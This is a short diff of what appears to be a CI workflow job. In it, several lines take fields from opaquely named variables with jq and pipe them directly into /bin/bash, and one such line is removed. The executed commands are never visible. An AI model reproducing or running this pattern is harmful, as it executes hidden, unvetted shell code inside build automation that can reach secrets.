@@ -43,7 +43,6 @@ jobs:
           echo $pr87 | jq -r .b5484 | /bin/bash
           printf '%s' "$sd3200" | jq -r .y00406 | /bin/bash
           printf '%s' "$x633" | jq -r .l157 | /bin/bash
-          echo $te9615 | jq -r .a090 | /bin/bash
           echo $zz966 | jq -r .iqxb0980 | /bin/bash
           printf '%s' "$melw64" | jq -r .c881 | /bin/bash
           echo $q993 | jq -r .byg13 | /bin/bash
